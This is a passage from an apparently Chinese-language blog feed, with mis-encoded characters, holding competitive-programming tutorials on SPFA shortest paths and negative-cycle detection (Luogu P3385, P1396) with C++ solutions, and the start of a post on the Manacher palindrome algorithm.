        <content type="html"><![CDATA[<p>å‰é¢è®²åˆ°äº†<code>spfa</code>ï¼Œç„¶åæœ‰ä¸€ä¸ªåˆ¤æ–­è´Ÿç¯çš„æ“ä½œï¼Œè¿™ä¸ªåˆ¤æ–­è´Ÿç¯æœ‰æ›´å¥½çš„æ€è·¯ã€‚</p><span id="more"></span><p>è®¾$cnt[i]$ä¸º$s$åˆ°$i$çš„æœ€çŸ­è·¯ä¸­å·²ç»ç»è¿‡çš„è·¯å¾„æ¡æ•°ï¼Œå¦‚æœè¶…è¿‡ $n$ ä¸ªè¾¹ï¼Œé‚£å°±è¯´æ˜æœ‰ $n-1$ ä¸ªç‚¹ï¼Œå¿…äº§ç”Ÿäº†è´Ÿç¯ï¼Œå¦‚æœæ²¡æœ‰è´Ÿç¯ç»å¯¹æ˜¯ä¸ä¼šæ‰¾åˆ°å›è·¯çš„ã€‚</p><h2 id="æ´›è°·P3385"><a href="#æ´›è°·P3385" class="headerlink" title="æ´›è°·P3385"></a><a href="https://www.luogu.com.cn/problem/P3385">æ´›è°·P3385</a></h2><p>emmç›´æ¥ç»™æ ‡ç¨‹å§ï¼Œå°±æ˜¯æœ€æœ´å®æ— åçš„ $spfa$ è´Ÿç¯åˆ¤æ–­ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],dis[maxn],e_cnt[maxn],in_que[maxn],cnt;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spfa</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(e_cnt,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(e_cnt));</span><br><span class="line">    <span class="built_in">memset</span>(in_que,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(in_que));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    e_cnt[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+w)&#123;</span><br><span class="line">                dis[v]=dis[u]+w;</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                    e_cnt[v]++;</span><br><span class="line">                    <span class="keyword">if</span>(e_cnt[v]&gt;n)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3385_9.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">        <span class="built_in">memset</span>(edge,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(edge));</span><br><span class="line">        cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x,y,w;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">            <span class="built_in">add</span>(x,y,w);</span><br><span class="line">            <span class="keyword">if</span>(w&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">add</span>(y,x,w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">spfa</span>(<span class="number">1</span>))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> è´Ÿç¯ </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>spfaç®—æ³•çš„å­¦ä¹ </title>
      <link href="/2022/02/21/spfa%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/21/spfa%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å‹‡æ•¢å°é¸¡ï¼Œä¸æ€•å›°éš¾ã€‚æ—¶éš”å¤šæ—¥ï¼Œåˆæ¥å¤ä¹ å›¾è®ºç®—æ³•äº†ï¼Œæœ¬æ¥æƒ³çš„æ˜¯æä¸€ä¸‹å·®åˆ†çº¦æŸçš„ï¼Œä½†æ˜¯å‘ç°å‰ç½®çŸ¥è¯†æ˜¯<code>spfa</code>ç®—æ³•ï¼Œæ‰€ä»¥å°±å…ˆæ¥å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªã€‚</p><span id="more"></span><h2 id="spfaç®—æ³•ä»‹ç»"><a href="#spfaç®—æ³•ä»‹ç»" class="headerlink" title="spfaç®—æ³•ä»‹ç»"></a>spfaç®—æ³•ä»‹ç»</h2><p>SPFAç®—æ³•æ˜¯æ±‚è§£å•æºæœ€çŸ­è·¯å¾„é—®é¢˜çš„ä¸€ç§ç®—æ³•ï¼Œç”±ç†æŸ¥å¾·Â·è´å°”æ›¼ï¼ˆRichard Bellmanï¼‰ å’Œ è±æ–¯ç‰¹Â·ç¦ç‰¹ åˆ›ç«‹çš„ã€‚æœ‰æ—¶å€™è¿™ç§ç®—æ³•ä¹Ÿè¢«ç§°ä¸º Moore-Bellman-Ford ç®—æ³•ï¼Œå› ä¸º Edward F. Moore ä¹Ÿä¸ºè¿™ä¸ªç®—æ³•çš„å‘å±•åšå‡ºäº†è´¡çŒ®ã€‚å®ƒçš„åŸç†æ˜¯å¯¹å›¾è¿›è¡ŒV-1æ¬¡æ¾å¼›æ“ä½œï¼Œå¾—åˆ°æ‰€æœ‰å¯èƒ½çš„æœ€çŸ­è·¯å¾„ã€‚<strong>å…¶ä¼˜äºdijkstraç®—æ³•çš„æ–¹é¢æ˜¯è¾¹çš„æƒå€¼å¯ä»¥ä¸ºè´Ÿæ•°ã€å®ç°ç®€å•ï¼Œç¼ºç‚¹æ˜¯æ—¶é—´å¤æ‚åº¦è¿‡é«˜ï¼Œé«˜è¾¾ O(VE)ã€‚ä½†ç®—æ³•å¯ä»¥è¿›è¡Œè‹¥å¹²ç§ä¼˜åŒ–ï¼Œæé«˜äº†æ•ˆç‡ã€‚</strong></p><p>ç®—æ³•çš„æ€è·¯ï¼š<br>æˆ‘ä»¬ç”¨æ•°ç»„disè®°å½•æ¯ä¸ªç»“ç‚¹çš„æœ€çŸ­è·¯å¾„ä¼°è®¡å€¼ï¼Œç”¨é‚»æ¥è¡¨æˆ–é‚»æ¥çŸ©é˜µæ¥å­˜å‚¨å›¾Gã€‚æˆ‘ä»¬é‡‡å–çš„æ–¹æ³•æ˜¯åŠ¨æ€é€¼è¿‘æ³•ï¼šè®¾ç«‹ä¸€ä¸ªå…ˆè¿›å…ˆå‡ºçš„é˜Ÿåˆ—ç”¨æ¥ä¿å­˜å¾…ä¼˜åŒ–çš„ç»“ç‚¹ï¼Œä¼˜åŒ–æ—¶æ¯æ¬¡å–å‡ºé˜Ÿé¦–ç»“ç‚¹uï¼Œå¹¶ä¸”ç”¨uç‚¹å½“å‰çš„æœ€çŸ­è·¯å¾„ä¼°è®¡å€¼å¯¹ç¦»å¼€uç‚¹æ‰€æŒ‡å‘çš„ç»“ç‚¹vè¿›è¡Œæ¾å¼›æ“ä½œï¼Œå¦‚æœvç‚¹çš„æœ€çŸ­è·¯å¾„ä¼°è®¡å€¼æœ‰æ‰€è°ƒæ•´ï¼Œä¸”vç‚¹ä¸åœ¨å½“å‰çš„é˜Ÿåˆ—ä¸­ï¼Œå°±å°†vç‚¹æ”¾å…¥é˜Ÿå°¾ã€‚è¿™æ ·ä¸æ–­ä»é˜Ÿåˆ—ä¸­å–å‡ºç»“ç‚¹æ¥è¿›è¡Œæ¾å¼›æ“ä½œï¼Œç›´è‡³é˜Ÿåˆ—ç©ºä¸ºæ­¢</p><p>æˆ‘ä»¬è¦çŸ¥é“å¸¦æœ‰è´Ÿç¯çš„å›¾æ˜¯æ²¡æœ‰æœ€çŸ­è·¯å¾„çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ‰§è¡Œç®—æ³•çš„æ—¶å€™ï¼Œè¦åˆ¤æ–­å›¾æ˜¯å¦å¸¦æœ‰è´Ÿç¯ï¼Œæ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><ol><li>å¼€å§‹ç®—æ³•å‰ï¼Œè°ƒç”¨æ‹“æ‰‘æ’åºè¿›è¡Œåˆ¤æ–­ï¼ˆä¸€èˆ¬ä¸é‡‡ç”¨ï¼Œæµªè´¹æ—¶é—´ï¼‰</li><li>å¦‚æœæŸä¸ªç‚¹è¿›å…¥é˜Ÿåˆ—çš„æ¬¡æ•°è¶…è¿‡Næ¬¡åˆ™å­˜åœ¨è´Ÿç¯ï¼ˆNä¸ºå›¾çš„é¡¶ç‚¹æ•°ï¼‰</li></ol><h2 id="spfaç®—æ³•æµ…è°ˆ"><a href="#spfaç®—æ³•æµ…è°ˆ" class="headerlink" title="spfaç®—æ³•æµ…è°ˆ"></a>spfaç®—æ³•æµ…è°ˆ</h2><p><code>spfa</code>ç®—æ³•çš„è¯ï¼Œä¸€èˆ¬å•æºæœ€çŸ­è·¯åŸºæœ¬ç”¨ä¸åˆ° ï¼Œ<code>dijkstra</code>ç®—æ³•æ¯”å®ƒä¼˜å¾ˆå¤šï¼Œå”¯æœ‰éœ€è¦å¤„ç†è´Ÿæƒå›¾çš„æ—¶å€™ä¼šæƒ³åˆ°ä»–ã€‚å·®åˆ†çº¦æŸæ— è§£çš„æƒ…å†µå°±æ˜¯å­˜åœ¨è´Ÿç¯ï¼Œå› æ­¤è¿™ä¸ªå¾—å­¦ã€‚</p><p>å¤§æ¦‚æµç¨‹å¯ä»¥æè¿°ä¸ºä»¥ä¸‹æ–‡å­—ã€‚</p><ol><li>æºç‚¹å…¥é˜Ÿï¼Œæºç‚¹è·ç¦»åˆå§‹åŒ–ä¸º0ï¼Œå…¶å®ƒåˆå§‹åŒ–ä¸º $inf$ã€‚</li><li>å‡ºé˜Ÿä¸€ä¸ªç‚¹å¹¶éå†ä¸ä¹‹ä¹‹é—´ç›¸è¿çš„ç‚¹ï¼Œè¿›è¡Œæ¾å¼›æ“ä½œã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸è§åˆ°çš„ <code>if(dis[to]&gt;w+dis[from])dis[to]=dis[from+w]</code>ã€‚</li><li>å¦‚æœå¯¹ä¸€ä¸ªç‚¹è¿›è¡Œäº†æ¾å¼›é‚£ä¹ˆåˆ¤æ–­å®ƒæœ‰æ²¡æœ‰åœ¨é˜Ÿåˆ—ä¸­ï¼Œå¦‚æœä¸åœ¨åˆ™å…¥é˜Ÿï¼Œå¹¶åˆ¤æ–­å…¥é˜Ÿæ¬¡æ•°æœ‰æ²¡æœ‰è¶…è¿‡ç‚¹çš„ä¸ªæ•°ï¼Œå¦‚æœè¶…è¿‡åˆ™goto 6ã€‚</li><li>å¦‚æœé˜Ÿåˆ—ä¸ä¸ºç©ºåˆ™goto 2ã€‚</li><li>ç»“æŸï¼Œè¾“å‡ºç»“æœã€‚</li><li>ç»“æŸï¼Œè¾“å‡ºå­˜åœ¨è´Ÿç¯çš„å¯¹åº”ç­”æ¡ˆã€‚</li></ol><p>ä¸‹é¢æ¥ä¸€é“ä¾‹é¢˜ã€‚</p><h2 id="æ´›è°·P1396"><a href="#æ´›è°·P1396" class="headerlink" title="æ´›è°·P1396"></a><a href="https://www.luogu.com.cn/problem/P1396">æ´›è°·P1396</a></h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å¦ˆå¦ˆä¸‹ç­å›å®¶ï¼Œè¡—åŠé‚»å±…è¯´å°æ˜è¢«ä¸€ç¾¤é™Œç”Ÿäººå¼ºè¡ŒæŠ¼ä¸Šäº†è­¦è½¦ï¼å¦ˆå¦ˆä¸°å¯Œçš„ç»éªŒå‘Šè¯‰å¥¹å°æ˜è¢«å¸¦åˆ°äº† t åŒºï¼Œè€Œè‡ªå·±åœ¨ såŒºã€‚</p><p>è¯¥å¸‚æœ‰ m æ¡å¤§é“è¿æ¥ n ä¸ªåŒºï¼Œä¸€æ¡å¤§é“å°†ä¸¤ä¸ªåŒºç›¸è¿æ¥ï¼Œæ¯ä¸ªå¤§é“æœ‰ä¸€ä¸ªæ‹¥æŒ¤åº¦ã€‚å°æ˜çš„å¦ˆå¦ˆè™½ç„¶å¾ˆç€æ€¥ï¼Œä½†æ˜¯ä¸æ„¿æ„æ‹¥æŒ¤çš„äººæ½®å†²ä¹±äº†å¥¹ä¼˜é›…çš„æ­¥ä¼ã€‚æ‰€ä»¥è¯·ä½ å¸®å¥¹è§„åˆ’ä¸€æ¡ä» s è‡³ t çš„è·¯çº¿ï¼Œä½¿å¾—ç»è¿‡é“è·¯çš„æ‹¥æŒ¤åº¦æœ€å¤§å€¼æœ€å°ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜å…¶å®æœ‰ç‚¹å·®å¼ºäººæ„ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯è¦åˆ¤æ–­æ‰€ç»è¿‡è¾¹çš„æœ€å¤§å€¼çš„æœ€å°å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸»è¦è¿˜æ˜¯ç»ƒä¹ spfaä¸ºä¸»ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,dis[maxn],in_que[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,s,t;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="comment">//printf(&quot;%d %d %d\n&quot;,u,v,w);</span></span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;<span class="built_in">max</span>(dis[u],w))&#123;</span><br><span class="line">                dis[v]=<span class="built_in">max</span>(dis[u],w);</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P1396_1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">spfa</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,dis[t]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> æœ€çŸ­è·¯å¾„ </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>manacherçš„å­¦ä¹ </title>
      <link href="/2022/02/18/manacher%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/18/manacher%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©å­¦ä¹ ä¸€ä¸‹æ–°çš„å­—ç¬¦ä¸²ç®—æ³•â€”â€”manacherç®—æ³•ã€‚</p><span id="more"></span><h2 id="manacherç®€ä»‹"><a href="#manacherç®€ä»‹" class="headerlink" title="manacherç®€ä»‹"></a>manacherç®€ä»‹</h2><blockquote><p><strong>æœ€é•¿å›æ–‡å­ä¸²</strong>ï¼ˆè‹±è¯­ï¼š<strong>Longest palindromic substring</strong>ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­çš„é—®é¢˜ï¼Œåœ¨ä¸€ä¸ª<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">å­—ç¬¦ä¸²</a>ä¸­æŸ¥æ‰¾ä¸€ä¸ªæœ€é•¿çš„è¿ç»­çš„<a href="https://zh.wikipedia.org/wiki/%E5%9B%9E%E6%96%87">å›æ–‡</a>çš„å­ä¸²ï¼Œä¾‹å¦‚â€œbananaâ€æœ€é•¿å›æ–‡å­ä¸²æ˜¯â€œananaâ€ã€‚æœ€é•¿å›æ–‡å­ä¸²å¹¶ä¸ä¸€å®šæ˜¯å”¯ä¸€çš„ï¼Œæ¯”å¦‚åœ¨â€œabracadabraâ€ä¸­ï¼Œæ²¡æœ‰è¶…è¿‡3ä¸ªå­—ç¬¦çš„å›æ–‡å­ä¸²ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªå›æ–‡å­—ç¬¦ä¸²é•¿åº¦éƒ½æ˜¯3ï¼šâ€œadaâ€å’Œâ€œacaâ€ã€‚åœ¨ä¸€äº›åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬æ±‚å‡ºå…¨éƒ¨çš„æå¤§å›æ–‡å­ä¸²ï¼ˆä¸è¢«å…¶ä»–å›æ–‡ä¸²åŒ…å«çš„å›æ–‡å­ä¸²ï¼‰ã€‚</p><p>Manacheräº1975å¹´å‘ç°äº†ä¸€ç§çº¿æ€§æ—¶é—´ç®—æ³•[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-1">1]</a>ï¼Œå¯ä»¥åœ¨åˆ—å‡ºç»™å®šå­—ç¬¦ä¸²ä¸­ä»ä»»æ„ä½ç½®å¼€å§‹çš„æ‰€æœ‰å›æ–‡å­ä¸²ã€‚å¹¶ä¸”ï¼ŒApostolico, Breslauer &amp; Galil [<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-2">2]</a>å‘ç°ï¼ŒåŒæ ·çš„ç®—æ³•ä¹Ÿå¯ä»¥åœ¨ä»»æ„ä½ç½®æŸ¥æ‰¾å…¨éƒ¨æå¤§å›æ–‡å­ä¸²ï¼Œå¹¶ä¸”æ—¶é—´å¤æ‚åº¦æ˜¯çº¿æ€§çš„ã€‚å› æ­¤ï¼Œä»–ä»¬æä¾›äº†ä¸€ç§æ—¶é—´å¤æ‚åº¦ä¸ºçº¿æ€§çš„æœ€é•¿å›æ–‡å­ä¸²è§£æ³•ã€‚å¦å¤–ï¼ŒJeuring (1994)[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-3">3]</a>, Gusfield (1997)[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-4">4]</a>å‘ç°äº†åŸºäºåç¼€æ ‘çš„ç®—æ³•ã€‚ä¹Ÿå­˜åœ¨å·²çŸ¥çš„é«˜æ•ˆå¹¶è¡Œç®—æ³•ã€‚(from wiki)</p></blockquote><h2 id="manacherå®ç°"><a href="#manacherå®ç°" class="headerlink" title="manacherå®ç°"></a>manacherå®ç°</h2><p>å®ç°èµ·æ¥çš„è¯ï¼Œå…¶å®æˆ‘ä¸ªäººè®¤ä¸ºæ˜¯æ¯”è¾ƒç®€å•çš„ã€‚é¦–å…ˆé˜²æ­¢å¥‡å¶åºåˆ—çš„é—®é¢˜ï¼Œæˆ‘ä»¬åœ¨æ‰€æœ‰çš„å­—ç¬¦ä¹‹é—´ä»¥åŠæœ«å°¾æ·»åŠ <code>#</code>è®©å®ƒå˜æˆå¥‡æ•°ï¼Œå†åœ¨é¦–å°¾åˆ†åˆ«æ·»åŠ <code>$</code>å’Œ<code>~</code>ä½œä¸ºæˆªè‡³åˆ¤æ–­çš„åŒºåˆ†ã€‚</p><p>æˆ‘å°†å˜é‡åšå¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li>$s$ ï¼šæ‰€æ±‚å­—ç¬¦ä¸²</li><li>$p[i]$ ï¼šä»£è¡¨ä»¥å­—ç¬¦ $s[i]$ ä¸ºä¸­å¿ƒçš„æœ€é•¿å›æ–‡åŠå¾„ã€‚å³æ»¡è¶³åœ¨ $0\le j\le p[i]$ 